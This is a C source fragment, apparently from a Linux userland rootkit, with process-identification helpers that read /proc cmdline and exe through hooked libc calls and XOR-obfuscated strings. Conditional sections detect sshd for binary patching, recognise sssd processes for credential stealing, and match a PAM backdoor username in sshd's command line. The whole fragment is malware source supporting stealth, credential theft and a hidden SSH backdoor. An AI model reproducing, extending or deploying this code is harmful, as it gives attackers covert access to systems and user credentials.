/* gets the path of pid's cmdline file & opens it
 * for reading. returns the resulting fd. */
int open_cmdline(const pid_t pid){
    char path[PROCPATH_MAX_SIZE], *cl;
    cl = xordup(CMDLINE_PATH);
    if(!cl) return -1;
    snprintf(path, sizeof(path), cl, pid);
    clean(cl);
    hook(COPEN);
    return (long)call(COPEN, path, 0, 0);
}

// mode = MODE_NAME || MODE_CMDLINE
char *procinfo(const pid_t pid, const u_short mode){
    hook(CREAD);

    int fd;
    if((fd = open_cmdline(pid)) < 0)
        return xordup(FALLBACK_PROCNAME);

    const size_t maxlen = mode == MODE_CMDLINE ? CMDLINE_MAX_SIZE : NAME_MAX_SIZE;
    char *procinfo = malloc(maxlen + 1);
    if(!procinfo){
        close(fd);
        return xordup(FALLBACK_PROCNAME);
    }
    memset(procinfo, 0, maxlen + 1);
    ssize_t c = (ssize_t)call(CREAD, fd, procinfo, maxlen);
    close(fd);
    if(!c){
        free(procinfo);
        return xordup(FALLBACK_PROCNAME);
    }

    if(mode == MODE_CMDLINE){
        for(ssize_t i = 0; i < c; i++)
            if(procinfo[i] == '\0')
                procinfo[i] = ' ';
        procinfo[c-1] = '\0';
    }

    return procinfo;
}

/* returns the path which /proc/self/exe leads to. */
char *selfexe(void){
    ssize_t rl;
    char *ret, *se;

    hook(CREADLINK);

    ret = malloc(EXE_MAX_SIZE);
    if(!ret) return NULL;
    memset(ret, 0, EXE_MAX_SIZE);

    se = xordup(SELF_EXE_PATH);
    if(!se){
        free(ret);
        return NULL;
    }
    rl = (long)call(CREADLINK, se, ret, EXE_MAX_SIZE-1);
    clean(se);
    if(rl <= 0){
        free(ret);
        return NULL;
    }else ret[rl]='\0';

    return ret;
}


// these functions use macros..
int cmpproc(const char *name){
    char *myname;
    int status=0;

    myname = procname();
    if(myname != NULL){
        status = strncmp(myname, name, strlen(myname)) == 0;
        clean(myname);
    }

    return status;
}
char *strproc(const char *name){
    char *myname, *status=NULL;
    
    myname = procname();
    if(myname != NULL){
        status = strstr(myname, name);
        clean(myname);
    }

    return status;
}
int process(const char *name){
    if(cmpproc(name) || strproc(name))
        return 1;
    return 0;
}


#if defined HARD_PATCH || defined SOFT_PATCH
int sshdproc(void){
    int sshd=0;
    char *myname = procname();
    if(myname != NULL){
        char *sshd_path = xordup(SSHD_BIN_PATH);
        if(sshd_path){
            sshd = strcmp(myname, sshd_path) == 0;
            clean(sshd_path);
        }
        clean(myname);
    }
    return sshd;
}
#endif


#ifdef ENABLE_STEAL
int sssdproc(void){
    if(xprocess(SSSD_BIN_PATH))
        return 1;

    int sssd = 0;
    char *myname = procname();
    if(myname != NULL){
        char *sssd_home = xordup(SSSD_HOME_DIR);
        if(sssd_home){
            sssd = strncmp(sssd_home, myname, strlen(sssd_home)) == 0;
            clean(sssd_home);
        }
        clean(myname);
    }
    return sssd;
}
#endif


#ifdef USE_PAM_BD
int magicsshd(void){
    char *pamname = xordup(BDUSERNAME);
    if(!pamname) return 0;

    char buf[8 + BDUSERNAME_SIZE], *sshd_fmt = xordup(SSHD_PROC_FMT);
    if(!sshd_fmt){
        clean(pamname);
        return 0;
    }
    int buflen = snprintf(buf, sizeof(buf), sshd_fmt, pamname);
    clean(sshd_fmt);
    clean(pamname);

    if(!buflen)
        return 0;

    int rv = 0;
    char *myname = proccmdl();
    if(myname != NULL){
        rv = strncmp(buf, myname, buflen) == 0;
        clean(myname);
    }
    return rv;
}
#endif